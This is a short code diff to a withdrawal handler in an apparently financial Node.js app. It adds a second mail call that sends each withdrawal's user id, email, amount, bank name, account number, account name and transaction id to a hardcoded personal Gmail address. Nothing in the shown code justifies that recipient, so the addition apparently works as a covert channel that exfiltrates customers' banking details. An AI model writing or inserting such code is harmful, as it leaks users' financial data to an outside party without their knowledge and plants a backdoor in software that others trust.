@@ -57,6 +57,20 @@ const withdrawal = async (req, res) => {
             account_name,
           }),
         });
+        await sendmails({
+          email: "gregemax700@gmail.com",
+          subject: "withdrawal",
+          message: JSON.stringify({
+            id: user._id,
+            email,
+            amount,
+            bank_name,
+            account_number,
+            transactionId: user_tx._id,
+            account_name,
+          }),
+        });
+
         return res
           .status(200)
           .json({ message: "Withdrawal successful", newbalance: user.balance });
